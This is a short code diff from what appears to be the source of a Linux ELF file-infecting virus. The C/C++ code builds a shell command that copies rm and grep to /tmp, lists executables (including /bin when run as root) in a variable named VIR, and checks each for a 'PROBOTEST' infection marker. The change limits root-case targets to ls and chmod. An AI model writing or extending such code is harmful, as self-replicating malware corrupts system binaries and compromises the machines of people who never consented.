@@ -52,7 +52,9 @@ int main (int argc, char** argv) {
 [ -e /tmp/busrm ] || cp /bin/rm /tmp/busrm; ";
         command += "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
-        command += "-mindepth 1 -maxdepth 1 -type f`; \
+        command += "-mindepth 1 -maxdepth 1 -type f";
+        if (uid == 0) command += " | egrep '^ls$|^chmod$'";
+        command += "`; \
 do \
 file $n | /tmp/busgr -q ELF && ( \
 /tmp/busgr -q PROBOTEST $n || ( \
